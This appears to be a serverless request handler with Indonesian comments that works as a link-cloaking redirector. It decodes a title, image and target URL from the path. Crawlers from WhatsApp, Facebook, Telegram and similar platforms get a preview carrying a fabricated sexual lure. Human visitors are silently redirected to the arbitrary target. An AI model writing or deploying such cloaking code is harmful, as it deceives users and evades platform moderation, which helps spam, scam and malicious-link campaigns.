export async function onRequest(context) {
    const { params, request } = context;
    const base64Data = params.path[0];
    const userAgent = request.headers.get("user-agent") || "";

    if (!base64Data || base64Data === "index.html") {
        return context.next();
    }

    try {
        const data = JSON.parse(atob(base64Data));
        const title = data.t || "";
        const image = data.i || "";
        const target = data.u || "";

        // Logic Random Deskripsi
        const count = Math.floor(Math.random() * 90001) + 10000;
        const templates = [
            `${count.toLocaleString()} Girls ready for you`,
            `${count.toLocaleString()} girls waiting for you`
        ];
        const randomDesc = templates[Math.floor(Math.random() * templates.length)];

        // DETEKSI BOT: Jika ini bot WhatsApp/FB/Telegram, JANGAN REDIRECT.
        // Berikan Meta Tags saja agar preview muncul.
        const isBot = /WhatsApp|facebookexternalhit|TelegramBot|Twitterbot|Slackbot/i.test(userAgent);

        if (isBot) {
            const html = `<!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>${title}</title>
                <meta property="og:title" content="${title}" />
                <meta property="og:description" content="▶️ ${randomDesc}" />
                <meta property="og:image" content="${image}" />
                <meta property="og:type" content="video.other" />
                <meta name="twitter:card" content="summary_large_image">
            </head>
            <body></body>
            </html>`;
            return new Response(html, { headers: { "content-type": "text/html;charset=UTF-8" } });
        }

        // JIKA MANUSIA: Redirect ke URL tujuan
        const finalTarget = target.startsWith('http') ? target : 'https://' + target;
        return Response.redirect(finalTarget, 302);

    } catch (e) {
        return context.next();
    }
}
